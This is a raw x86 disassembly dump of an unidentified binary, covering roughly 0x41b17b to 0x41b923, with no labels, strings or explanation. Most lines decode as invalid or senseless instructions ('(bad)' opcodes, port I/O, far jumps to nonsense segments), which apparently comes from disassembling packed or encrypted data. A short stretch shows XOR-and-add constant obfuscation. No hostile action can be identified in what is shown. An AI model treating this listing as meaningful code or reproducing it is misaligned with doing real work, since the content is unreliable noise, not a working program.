  41b17b:	ins    DWORD PTR es:[edi],dx
  41b17c:	dec    ecx
  41b17d:	jl     0x41b1f8
  41b17f:	cli    
  41b180:	lods   eax,DWORD PTR ds:[esi]
  41b181:	mov    ah,0xe8
  41b183:	add    BYTE PTR [ebx+0x5c],bl
  41b186:	and    eax,0x781e7f37
  41b18b:	out    0x9,eax
  41b18d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18e:	iret   
  41b18f:	sub    DWORD PTR [ebx+0x23],esi
  41b192:	or     ebp,DWORD PTR [ecx]
  41b194:	dec    ebx
  41b195:	adc    eax,0xfce8f20f
  41b19a:	test   esi,esi
  41b19c:	push   edi
  41b19d:	jl     0x41b218
  41b19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1a0:	jo     0x41b1a0
  41b1a2:	mov    bl,0x3f
  41b1a4:	in     eax,0x35
  41b1a6:	out    dx,eax
  41b1a7:	rcr    DWORD PTR [eax+0x71df251],0x85
  41b1ae:	mov    ch,0x4b
  41b1b0:	imul   DWORD PTR [edx]
  41b1b2:	ins    DWORD PTR es:[edi],dx
  41b1b3:	or     BYTE PTR [edx],bl
  41b1b5:	div    DWORD PTR [esi+edi*1]
  41b1b8:	into   
  41b1b9:	pop    es
  41b1ba:	jmp    FWORD PTR [ecx+0x3626b12d]
  41b1c0:	or     eax,0xef938b68
  41b1c5:	jno    0x41b189
  41b1c7:	call   0x9b2f5440
  41b1cc:	cwde   
  41b1cd:	mov    bl,0xe1
  41b1cf:	pop    ds
  41b1d0:	mov    dh,0x56
  41b1d2:	or     ah,ch
  41b1d4:	push   ebp
  41b1d5:	mov    edx,0x40e6624b
  41b1da:	loope  0x41b1b7
  41b1dc:	cli    
  41b1dd:	add    BYTE PTR [ecx-0x64e87692],bh
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	addr16 ss rcl dh,0x42
  41b1fa:	into   
  41b1fb:	call   0x78c18e28
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b281
  41b205:	ret    0x4a7c
  41b208:	push   edx
  41b209:	out    dx,eax
  41b20a:	sbb    ebx,DWORD PTR [esi-0x6d]
  41b20d:	sbb    eax,0x7ddc658c
  41b212:	fistp  WORD PTR [esi]
  41b214:	adc    dl,ch
  41b216:	icebp  
  41b217:	out    dx,eax
  41b218:	mov    ss,WORD PTR [ebx-0x1fa789f2]
  41b21e:	push   esp
  41b21f:	(bad)  
  41b220:	out    dx,al
  41b221:	or     cl,BYTE PTR [ecx+0x271b79c0]
  41b227:	sbb    eax,DWORD PTR [ebx+0x50]
  41b22a:	sbb    BYTE PTR [edi-0x72a5b5b4],0xee
  41b231:	or     bl,BYTE PTR [edi-0x41]
  41b234:	xor    BYTE PTR [ecx],bh
  41b236:	push   ecx
  41b237:	lahf   
  41b238:	add    esi,ebp
  41b23a:	nop
  41b23b:	call   0x9529c8b7
  41b240:	bound  esi,QWORD PTR [ecx+0x7d]
  41b243:	fld    st(5)
  41b245:	popf   
  41b246:	lock sub al,BYTE PTR [edx]
  41b249:	repnz mov ecx,ebx
  41b24c:	mov    ds:0x9a55063c,al
  41b251:	mov    esi,0xdd4b9f3d
  41b256:	clc    
  41b257:	test   eax,esi
  41b259:	(bad)  
  41b25a:	and    DWORD PTR [esi+0x1b343ed7],ecx
  41b260:	inc    edi
  41b261:	aaa    
  41b262:	jmp    FWORD PTR [ebx+0x301d829f]
  41b268:	jge    0x41b23d
  41b26a:	in     eax,dx
  41b26b:	shl    BYTE PTR [edx+edx*8+0x51],1
  41b26f:	jmp    0x13a6:0x76674bc6
  41b276:	push   ebx
  41b277:	add    BYTE PTR [ecx-0x77960eeb],dh
  41b27d:	out    0x52,al
  41b27f:	jne    0x41b286
  41b281:	rcl    BYTE PTR [eax+eiz*1-0x5e84e8ef],0xee
  41b289:	(bad)  
  41b28a:	fcom   st(4)
  41b28c:	call   0xf843:0x945ad5fb
  41b293:	sbb    esp,DWORD PTR [ecx+0x8]
  41b296:	sbb    DWORD PTR [edi],edx
  41b298:	mov    DWORD PTR [edx+esi*1+0x40],edx
  41b29c:	sub    esp,eax
  41b29e:	mov    DWORD PTR [ecx],ecx
  41b2a0:	xchg   esi,eax
  41b2a1:	mov    edi,0x697511a5
  41b2a6:	adc    dh,bh
  41b2a8:	mov    edi,0x51839f81
  41b2ad:	loop   0x41b26a
  41b2af:	mov    bh,0x45
  41b2b1:	nop
  41b2b2:	jne    0x41b2ae
  41b2b4:	xchg   DWORD PTR [esi-0x10],eax
  41b2b7:	push   ds
  41b2b8:	dec    eax
  41b2b9:	call   0xd5fec6a2
  41b2be:	sub    eax,0x3aa691ea
  41b2c3:	sub    al,0xf7
  41b2c5:	ss pop edx
  41b2c7:	mov    edi,0xc875bb65
  41b2cc:	cmp    eax,0x27347214
  41b2d1:	fisubr DWORD PTR [esi+0x52]
  41b2d4:	jnp    0x41b271
  41b2d6:	ins    DWORD PTR es:[edi],dx
  41b2d7:	and    eax,0x2ae1f455
  41b2dc:	lock jmp 0xfc75:0x9f926300
  41b2e4:	and    DWORD PTR [ecx],edx
  41b2e6:	and    edi,DWORD PTR [ecx+0x9]
  41b2e9:	adc    ch,BYTE PTR [ecx-0x31]
  41b2ec:	push   ebx
  41b2ed:	stos   DWORD PTR es:[edi],eax
  41b2ee:	imul   esp,eax,0x70
  41b2f1:	jnp    0x41b304
  41b2f3:	outs   dx,BYTE PTR ds:[esi]
  41b2f4:	loope  0x41b2b1
  41b2f6:	xor    edx,DWORD PTR [ebp+eiz*4-0x2]
  41b2fa:	mov    ebx,0x2c979b94
  41b2ff:	push   cs
  41b300:	add    dl,dl
  41b302:	popf   
  41b303:	fsin   
  41b305:	jecxz  0x41b2d9
  41b307:	fcom   DWORD PTR [eax]
  41b309:	cdq    
  41b30a:	add    al,0x74
  41b30c:	iret   
  41b30d:	pop    esi
  41b30e:	ret    0x6d0c
  41b311:	fcmovnbe st,st(0)
  41b313:	(bad)  [edi-0x41a57483]
  41b319:	outs   dx,BYTE PTR ds:[esi]
  41b31a:	rol    BYTE PTR [edi],1
  41b31c:	rcr    BYTE PTR [edi],0x3
  41b31f:	xchg   ebp,eax
  41b320:	call   0x8a14:0x54fdb7aa
  41b327:	jnp    0x41b2dc
  41b329:	add    eax,0x2750f609
  41b32e:	fidiv  WORD PTR [ebp+0x2a]
  41b331:	sbb    DWORD PTR ds:0x4b9e8f07,ebp
  41b337:	loope  0x41b2c0
  41b339:	adc    al,0xe6
  41b33b:	add    edx,esp
  41b33d:	mov    dl,0x91
  41b33f:	and    al,0x6a
  41b341:	dec    ecx
  41b342:	stc    
  41b343:	lock repnz inc ecx
  41b346:	add    ch,dh
  41b348:	xchg   esi,eax
  41b349:	sbb    eax,0x66fee0e7
  41b34e:	sahf   
  41b34f:	jno    0x41b31b
  41b351:	in     al,dx
  41b352:	shl    BYTE PTR [ebp+ebx*1+0x10],1
  41b356:	daa    
  41b357:	jb     0x41b3a8
  41b359:	sbb    dh,BYTE PTR [eax]
  41b35b:	xchg   ebx,eax
  41b35c:	jge    0x41b2e8
  41b35e:	jmp    FWORD PTR [esi]
  41b360:	adc    bl,BYTE PTR [edi-0x2424a828]
  41b366:	mov    esi,0x9310ec39
  41b36b:	repz and edx,ebx
  41b36e:	sub    eax,eax
  41b370:	scas   eax,DWORD PTR es:[edi]
  41b371:	add    DWORD PTR [ebx-0x7a118921],ebp
  41b377:	dec    eax
  41b378:	push   eax
  41b379:	mov    ch,0x92
  41b37b:	gs test eax,0xe2a607f9
  41b381:	mov    cl,0xf3
  41b383:	fild   WORD PTR [eax-0x2681a9ca]
  41b389:	loope  0x41b3af
  41b38b:	mov    edi,0xc72f08c6
  41b390:	retf   0x6071
  41b393:	jmp    0x1b73:0x12331170
  41b39a:	inc    esp
  41b39b:	add    eax,0x413db56f
  41b3a0:	lea    esi,[edi]
  41b3a2:	out    dx,al
  41b3a3:	sbb    DWORD PTR [ecx+0x3eeda934],ecx
  41b3a9:	lea    ecx,[ecx]
  41b3ab:	popf   
  41b3ac:	cmp    edx,DWORD PTR [esi]
  41b3ae:	cmp    edx,edx
  41b3b0:	icebp  
  41b3b1:	repnz xlat BYTE PTR ds:[ebx]
  41b3b3:	cmp    ch,BYTE PTR [ebx-0x5b]
  41b3b6:	sti    
  41b3b7:	sbb    DWORD PTR [ebx],0x9854bccc
  41b3bd:	in     al,dx
  41b3be:	ret    0xc1
  41b3c1:	imul   ecx,DWORD PTR [eax+edx*1-0x76d3c39a],0x2a
  41b3c9:	cld    
  41b3ca:	pop    ebp
  41b3cb:	test   eax,0x1ce502f7
  41b3d0:	fdivr  DWORD PTR [ebx-0x62add3d2]
  41b3d6:	je     0x41b41d
  41b3d8:	mov    ebp,0xbff2e3fc
  41b3dd:	enter  0xb091,0x34
  41b3e1:	daa    
  41b3e2:	or     al,0xb7
  41b3e4:	cmp    BYTE PTR [ebp+0x7a64fde4],ah
  41b3ea:	mov    ch,0xe2
  41b3ec:	xor    eax,0xc2504236
  41b3f1:	and    BYTE PTR [ecx-0x667a043d],0x9
  41b3f8:	jnp    0x41b43f
  41b3fa:	aas    
  41b3fb:	mov    esi,0x4e8051fc
  41b400:	ins    BYTE PTR es:[edi],dx
  41b401:	bound  ecx,QWORD PTR [ecx]
  41b403:	aad    0xfd
  41b405:	jne    0x41b39c
  41b407:	sub    esi,DWORD PTR [edi-0x2092f91]
  41b40d:	iret   
  41b40e:	push   ss
  41b40f:	repz mov esi,0xe26908d
  41b415:	xor    BYTE PTR [edi+0x5e],ch
  41b418:	fsubr  QWORD PTR [edi]
  41b41a:	call   0xe02b:0xc1af0f85
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	test   eax,0xc00f1971
  41b4be:	loop   0x41b53f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b451
  41b4c6:	adc    ch,0x82
  41b4c9:	push   0xffffffe2
  41b4cb:	test   al,0xe6
  41b4cd:	into   
  41b4ce:	das    
  41b4cf:	jb     0x41b4da
  41b4d1:	mov    WORD PTR [eax-0x711ba0b0],gs
  41b4d7:	adc    DWORD PTR [edx],ecx
  41b4d9:	mov    ah,0x4e
  41b4db:	mov    WORD PTR [ebx-0x7b],?
  41b4de:	sar    BYTE PTR [ebx],cl
  41b4e0:	inc    edi
  41b4e1:	add    eax,0xe751d24f
  41b4e6:	(bad)  
  41b4e7:	mov    eax,ds:0xabe8296c
  41b4ec:	sbb    al,0x8d
  41b4ee:	out    dx,eax
  41b4ef:	push   edi
  41b4f0:	ja     0x41b543
  41b4f2:	pop    ecx
  41b4f3:	ja     0x41b565
  41b4f5:	jmp    0x41b557
  41b4f7:	scas   eax,DWORD PTR es:[edi]
  41b4f8:	pusha  
  41b4f9:	es jnp 0x41b4de
  41b4fc:	ret    
  41b4fd:	sub    eax,0xa77abecb
  41b502:	cmc    
  41b503:	jmp    0x41b497
  41b505:	or     al,0x8e
  41b507:	pop    eax
  41b508:	or     eax,0x123b033b
  41b50d:	pop    ebx
  41b50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50f:	scas   al,BYTE PTR es:[edi]
  41b510:	ret    0x1c1c
  41b513:	xor    BYTE PTR [esi+0x727edc02],0xd6
  41b51a:	div    BYTE PTR [edx]
  41b51c:	dec    esp
  41b51d:	sub    BYTE PTR [esi+0x116e6ba2],ah
  41b523:	mov    ebp,0x27a9aece
  41b528:	fisubr WORD PTR [esi+eiz*2+0x18f76239]
  41b52f:	aad    0xca
  41b531:	adc    cl,BYTE PTR [ebp+0x4d]
  41b534:	and    al,0x39
  41b536:	(bad)  
  41b537:	sub    al,0xf4
  41b539:	aam    0x6b
  41b53b:	ret    0xd089
  41b53e:	xchg   ecx,eax
  41b53f:	mov    ch,0x68
  41b541:	adc    esi,0x549cc9c1
  41b547:	adc    al,0xa9
  41b549:	mov    cl,0xc2
  41b54b:	cmp    dh,BYTE PTR [esi+ebx*1-0x388c5600]
  41b552:	pop    es
  41b553:	cld    
  41b554:	xchg   BYTE PTR [edi],ch
  41b556:	dec    eax
  41b557:	mov    cl,0x57
  41b559:	fcomp  DWORD PTR [ebp-0x6f]
  41b55c:	pop    ds
  41b55d:	nop
  41b55e:	daa    
  41b55f:	aaa    
  41b560:	je     0x41b585
  41b562:	sbb    bh,bh
  41b564:	cld    
  41b565:	push   ds
  41b566:	xlat   BYTE PTR ds:[ebx]
  41b567:	or     al,0xc8
  41b569:	cmp    eax,0xf78a1440
  41b56e:	cmp    bh,al
  41b570:	mov    ebp,DWORD PTR [ecx-0x2dbec311]
  41b576:	(bad)  
  41b577:	sti    
  41b578:	mov    dh,0xba
  41b57a:	gs jb  0x41b5d0
  41b57d:	call   0x9e59:0x5f8ce7da
  41b584:	loop   0x41b5a7
  41b586:	xlat   BYTE PTR ss:[ebx]
  41b588:	xchg   ebp,eax
  41b589:	out    0xd5,eax
  41b58b:	lock fisubr WORD PTR [ebx]
  41b58e:	sbb    eax,0x49514987
  41b593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b594:	xor    bh,BYTE PTR [bx+si]
  41b597:	mov    al,0x6
  41b599:	mov    bl,0x7f
  41b59b:	mov    ch,BYTE PTR [ecx-0x363d4a20]
  41b5a1:	and    al,0xdf
  41b5a3:	fimul  DWORD PTR [ecx+esi*1]
  41b5a6:	mov    ds:0xa36b9ec4,al
  41b5ab:	xor    eax,0xd269e5f3
  41b5b0:	mov    bh,0x98
  41b5b2:	call   DWORD PTR [edi+0x66]
  41b5b5:	mov    esi,0x3f636ee8
  41b5ba:	outs   dx,BYTE PTR ds:[esi]
  41b5bb:	sub    dh,0xdf
  41b5be:	stos   DWORD PTR es:[edi],eax
  41b5bf:	xlat   BYTE PTR ds:[ebx]
  41b5c0:	cmp    bh,BYTE PTR [edx+0x28]
  41b5c3:	out    0x6b,al
  41b5c5:	mov    ebx,0x37894644
  41b5ca:	push   0x94743a13
  41b5cf:	out    dx,al
  41b5d0:	jmp    0x7262:0x5793ba41
  41b5d7:	add    al,BYTE PTR [eax-0x68438789]
  41b5dd:	jl     0x41b636
  41b5df:	sub    eax,0xe0d64797
  41b5e4:	adc    ecx,esi
  41b5e6:	hlt    
  41b5e7:	or     eax,0xa505a135
  41b5ec:	shl    cl,1
  41b5ee:	sub    DWORD PTR [esi],0xffffff92
  41b5f1:	gs inc esp
  41b5f3:	aad    0xd1
  41b5f5:	inc    ebp
  41b5f6:	fdiv   QWORD PTR [edi-0x78f0715b]
  41b5fc:	mul    ch
  41b5fe:	inc    esi
  41b5ff:	icebp  
  41b600:	adc    al,0x9f
  41b602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b603:	mov    edx,esp
  41b605:	out    0x87,al
  41b607:	adc    BYTE PTR [ebx+0x3860764b],al
  41b60d:	out    0x4,eax
  41b60f:	add    eax,0x2d860f83
  41b614:	xor    cl,ah
  41b616:	jne    0x41b5e8
  41b618:	(bad)  
  41b619:	mov    dh,0xa8
  41b61b:	leave  
  41b61c:	mov    cl,0x15
  41b61e:	and    eax,0x8b4958d2
  41b623:	and    esp,DWORD PTR [eax]
  41b625:	sub    eax,0x3b1175f3
  41b62a:	pop    ebx
  41b62b:	or     DWORD PTR ds:0xb873b28d,eax
  41b631:	pushf  
  41b632:	loope  0x41b61f
  41b634:	dec    eax
  41b635:	(bad)  
  41b636:	push   ds
  41b637:	call   0xb6a4:0x9ff5a2d
  41b63e:	shr    ecx,cl
  41b640:	test   al,0xaa
  41b642:	mov    eax,eax
  41b644:	into   
  41b645:	sbb    DWORD PTR [esi],esi
  41b647:	lods   eax,DWORD PTR ds:[esi]
  41b648:	sub    DWORD PTR [ecx],edi
  41b64a:	jl     0x41b66e
  41b64c:	pop    edi
  41b64d:	jb     0x41b5fe
  41b64f:	daa    
  41b650:	xor    ebp,DWORD PTR [ecx]
  41b652:	(bad)  
  41b653:	es retf 
  41b655:	mov    bl,0x50
  41b657:	dec    eax
  41b658:	inc    eax
  41b659:	in     al,0x6f
  41b65b:	dec    esp
  41b65c:	fisttp WORD PTR ds:0xdc256629
  41b662:	jae    0x41b646
  41b664:	jnp    0x41b617
  41b666:	hlt    
  41b667:	ret    
  41b668:	ja     0x21a073b7
  41b66e:	adc    al,bl
  41b670:	sbb    BYTE PTR [edi-0x6ca1a154],ch
  41b676:	fld    TBYTE PTR [eax+ebp*8-0x3]
  41b67a:	aad    0x3
  41b67c:	fimul  WORD PTR [ecx+esi*8]
  41b67f:	retf   0xdcf0
  41b682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b683:	in     al,dx
  41b684:	(bad)  
  41b685:	jmp    0x339db67
  41b68a:	fisttp DWORD PTR [esi]
  41b68c:	mov    bl,0x7
  41b68e:	or     BYTE PTR [edx-0x35903339],dl
  41b694:	jmp    0x41b650
  41b696:	stos   DWORD PTR es:[edi],eax
  41b697:	test   DWORD PTR [esi+0x5c],ebp
  41b69a:	mov    ds:0x64096879,al
  41b69f:	xor    DWORD PTR [eax],edx
  41b6a1:	ss push edi
  41b6a3:	imul   ecx,DWORD PTR [edi-0x2cc024e0],0x2e
  41b6aa:	aam    0x41
  41b6ac:	adc    cl,ah
  41b6ae:	jl     0x41b650
  41b6b0:	arpl   WORD PTR [edi],ax
  41b6b2:	(bad)  
  41b6b3:	pop    esi
  41b6b4:	not    DWORD PTR [ebp+0x68eb6cbf]
  41b6ba:	jne    0x41b6c3
  41b6bc:	sbb    BYTE PTR [ebp+0x9fb6de2],ah
  41b6c2:	int3   
  41b6c3:	cmp    bl,BYTE PTR [edi]
  41b6c5:	ins    BYTE PTR es:[edi],dx
  41b6c6:	lods   al,BYTE PTR ds:[esi]
  41b6c7:	fild   QWORD PTR [edx+0x6129eb4f]
  41b6cd:	scas   al,BYTE PTR es:[edi]
  41b6ce:	jl     0x41b74e
  41b6d0:	lods   al,BYTE PTR ds:[esi]
  41b6d1:	imul   edi,DWORD PTR [eax-0x801ce5b],0x94c2e1a8
  41b6db:	mov    bh,0x38
  41b6dd:	xor    eax,ecx
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx+0x41b768f6]
  41b6f4:	push   eax
  41b6f5:	push   0x787fe0d8
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b722
  41b6ff:	popa   
  41b700:	das    
  41b701:	fcomp  st(6)
  41b703:	sub    BYTE PTR [eax+0xc],dl
  41b706:	out    0x4d,eax
  41b708:	cmc    
  41b709:	cmp    esp,eax
  41b70b:	loopne 0x41b72f
  41b70d:	xchg   ebx,eax
  41b70e:	lds    esi,FWORD PTR [ebp+0x2]
  41b711:	retf   0xac2d
  41b714:	sbb    al,0x6c
  41b716:	mov    esi,0x9a85e77b
  41b71b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b71d:	imul   edx,DWORD PTR [ecx-0x24],0x5775f378
  41b724:	cmp    ebp,DWORD PTR [esi]
  41b726:	aas    
  41b727:	jns    0x41b7a7
  41b729:	(bad)  
  41b72b:	retf   
  41b72c:	lock jmp 0x41b720
  41b72f:	xlat   BYTE PTR ds:[ebx]
  41b730:	xor    al,0xe
  41b732:	jp     0x41b6e8
  41b734:	ins    DWORD PTR es:[edi],dx
  41b735:	out    0xa1,al
  41b737:	jo     0x41b768
  41b739:	or     cl,BYTE PTR [ebx]
  41b73b:	out    dx,eax
  41b73c:	imul   DWORD PTR [eax-0x1290cfcf]
  41b742:	inc    ebx
  41b743:	ret    
  41b744:	shl    DWORD PTR ds:0x7b90587,1
  41b74a:	or     bh,ah
  41b74c:	scas   al,BYTE PTR es:[edi]
  41b74d:	jo     0x41b79b
  41b74f:	adc    al,0xed
  41b751:	xchg   edx,eax
  41b752:	jo     0x41b7c0
  41b754:	adc    esp,DWORD PTR [edx+0xc]
  41b757:	fdiv   DWORD PTR [ebp-0x6c]
  41b75a:	or     ecx,DWORD PTR [ebp-0x11199748]
  41b760:	pushf  
  41b761:	push   ebx
  41b762:	in     al,dx
  41b763:	mov    edi,0xbee68209
  41b768:	sub    DWORD PTR [edx+0x24],ebx
  41b76b:	jno    0x41b7ec
  41b76d:	cs push es
  41b76f:	jp     0x41b7de
  41b771:	in     eax,dx
  41b772:	hlt    
  41b773:	cwde   
  41b774:	jge    0x41b7b1
  41b776:	jge    0x41b7d0
  41b778:	pop    esp
  41b779:	pop    ds
  41b77a:	retf   0x336f
  41b77d:	sub    ecx,edx
  41b77f:	add    al,0xd7
  41b781:	cmp    al,BYTE PTR [ecx-0x17]
  41b784:	jl     0x41b711
  41b786:	fwait
  41b787:	mov    cl,0x61
  41b789:	add    BYTE PTR [edx-0x2c39aafb],bl
  41b78f:	add    eax,0x2890a93a
  41b794:	lds    ebp,FWORD PTR [edi+0x399a907]
  41b79a:	inc    edx
  41b79b:	xchg   ecx,eax
  41b79c:	push   cs
  41b79d:	sub    DWORD PTR [edi-0x41],edi
  41b7a0:	and    ch,BYTE PTR [ebx-0x4a2b1329]
  41b7a6:	push   ds
  41b7a7:	lock push edi
  41b7a9:	ins    BYTE PTR es:[edi],dx
  41b7aa:	xchg   ebx,eax
  41b7ab:	mov    bl,0xea
  41b7ad:	xchg   DWORD PTR [eax],eax
  41b7af:	inc    edx
  41b7b0:	sahf   
  41b7b1:	jno    0x41b801
  41b7b3:	rol    esi,1
  41b7b5:	adc    bl,BYTE PTR [eax+0x4a]
  41b7b8:	mov    eax,0x88b7da5a
  41b7bd:	inc    edx
  41b7be:	(bad)  
  41b7c0:	sbb    eax,0xb8246151
  41b7c5:	jmp    0x290a:0xd68c0cdb
  41b7cc:	lock out 0x4b,al
  41b7cf:	mov    al,0x87
  41b7d1:	inc    esi
  41b7d2:	sub    eax,0xbcdf0b60
  41b7d7:	xor    dl,ah
  41b7d9:	mov    BYTE PTR [edi],bl
  41b7db:	xor    ebp,edi
  41b7dd:	call   0xc43243a2
  41b7e2:	jle    0x41b78e
  41b7e4:	mov    ds:0x8f88f07d,eax
  41b7e9:	mov    eax,DWORD PTR [ebx-0x15]
  41b7ec:	adc    DWORD PTR [esi],esi
  41b7ee:	stos   BYTE PTR es:[edi],al
  41b7ef:	loopne 0x41b842
  41b7f1:	lods   al,BYTE PTR ds:[esi]
  41b7f2:	sbb    bl,bh
  41b7f4:	dec    eax
  41b7f5:	iret   
  41b7f6:	adc    eax,0x2d5a26e9
  41b7fb:	iret   
  41b7fc:	retf   
  41b7fd:	sbb    DWORD PTR [ecx+0x3ebbcfa7],eax
  41b803:	dec    edi
  41b804:	fmul   QWORD PTR [esi+0x59]
  41b807:	call   0x47232af0
  41b80c:	test   al,0xc5
  41b80e:	test   eax,0x3173f7f7
  41b813:	jo     0x41b7a1
  41b815:	ds out dx,al
  41b817:	mov    es,WORD PTR [ebx+ecx*8]
  41b81a:	or     al,0xd4
  41b81c:	into   
  41b81d:	fwait
  41b81e:	aam    0xa7
  41b820:	mov    edx,0x1d342b1d
  41b825:	or     al,0xb5
  41b827:	shr    DWORD PTR [esi-0x18],1
  41b82a:	jnp    0x41b8a6
  41b82c:	or     eax,0x1f609a34
  41b831:	push   0xffffffb1
  41b833:	cli    
  41b834:	pop    esp
  41b835:	retf   0xb45
  41b838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b839:	mov    bl,0x9b
  41b83b:	call   0x1e0e:0xd70a903c
  41b842:	and    dl,BYTE PTR [ebp-0x630f2c0d]
  41b848:	mov    DWORD PTR [esi+eax*4],esp
  41b84b:	mov    DWORD PTR [ebx+esi*2],ecx
  41b84e:	dec    edi
  41b84f:	enter  0x9fe0,0x94
  41b853:	adc    eax,DWORD PTR [eax]
  41b855:	cli    
  41b856:	dec    esp
  41b857:	xor    ch,BYTE PTR [ebx]
  41b859:	int3   
  41b85a:	mov    edi,edi
  41b85c:	and    al,ah
  41b85e:	push   edx
  41b85f:	jle    0x41b81e
  41b861:	rol    DWORD PTR [edx+0x191eb127],0x4e
  41b868:	dec    edi
  41b869:	pop    eax
  41b86a:	or     BYTE PTR [edi-0x42ab3cef],al
  41b870:	sub    ah,ch
  41b872:	jae    0x41b856
  41b874:	call   0xff49:0xbb1ecaaf
  41b87b:	lea    ecx,[ebx+0x58]
  41b87e:	and    BYTE PTR [edi-0x2f],0x7
  41b882:	sub    bh,cl
  41b884:	enter  0xc311,0x71
  41b888:	sbb    eax,0x3ec37043
  41b88d:	jle    0x41b86b
  41b88f:	pop    eax
  41b890:	pop    ds
  41b891:	mov    bh,0x3c
  41b893:	ja     0x41b8c7
  41b895:	or     DWORD PTR [ecx+ebx*4],eax
  41b898:	sub    BYTE PTR [ebx],bh
  41b89a:	push   esp
  41b89b:	in     al,dx
  41b89c:	xchg   edi,eax
  41b89d:	mov    WORD PTR [edi-0x7e231e0b],?
  41b8a3:	inc    dl
  41b8a5:	inc    esi
  41b8a6:	inc    edx
  41b8a7:	inc    ebp
  41b8a8:	stos   BYTE PTR es:[edi],al
  41b8a9:	sub    DWORD PTR [ebx-0x5c5e4d44],edx
  41b8af:	push   0x5f9c36be
  41b8b4:	xchg   ecx,eax
  41b8b5:	push   0x48
  41b8b7:	jle    0x41b8aa
  41b8b9:	ret    
  41b8ba:	icebp  
  41b8bb:	jmp    0x41b925
  41b8bd:	xor    al,0xfb
  41b8bf:	cmp    edx,edi
  41b8c1:	mov    esp,0x8ae77dd3
  41b8c6:	icebp  
  41b8c7:	in     eax,dx
  41b8c8:	mov    DWORD PTR [ecx+0x10],esi
  41b8cb:	outs   dx,BYTE PTR ds:[esi]
  41b8cc:	aas    
  41b8cd:	mov    DWORD PTR [esi+0x13],edx
  41b8d0:	std    
  41b8d1:	les    edi,FWORD PTR [edx]
  41b8d3:	pop    edx
  41b8d4:	and    BYTE PTR [edx],ch
  41b8d6:	push   edi
  41b8d7:	out    dx,al
  41b8d8:	sahf   
  41b8d9:	in     eax,0x4b
  41b8db:	bound  eax,QWORD PTR [ebx+0x37967dc0]
  41b8e1:	iret   
  41b8e2:	cmp    eax,esi
  41b8e4:	or     ebx,0x21
  41b8e7:	inc    BYTE PTR [edi+edi*1-0x34]
  41b8eb:	jb     0x41b872
  41b8ed:	scas   al,BYTE PTR es:[edi]
  41b8ee:	je     0x41b895
  41b8f0:	loopne 0x41b948
  41b8f2:	mov    dh,0xa
  41b8f4:	mov    esi,0x7aa87996
  41b8f9:	cmp    ebx,DWORD PTR [ecx+0x71]
  41b8fc:	sahf   
  41b8fd:	(bad)
  41b902:	jbe    0x41b8c0
  41b904:	inc    esp
  41b905:	les    esp,FWORD PTR [eax+edx*8-0x4e]
  41b909:	fdiv   st(0),st
  41b90b:	jmp    0x41b895
  41b90d:	mov    ch,0x1c
  41b90f:	cmp    BYTE PTR cs:[esp+ebx*2+0xf9d5fb6],0xaf
  41b918:	add    cl,BYTE PTR [ebx+0x30e9fc55]
  41b91e:	add    al,BYTE PTR [eax]
  41b920:	add    dh,al
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
